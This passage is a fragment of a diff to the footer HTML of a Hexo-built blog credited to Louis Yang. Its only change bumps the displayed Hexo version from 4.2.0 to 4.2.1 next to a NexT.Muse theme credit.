   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Louis Yang</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
   </div>
   <span class="post-meta-divider">|</span>
   <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
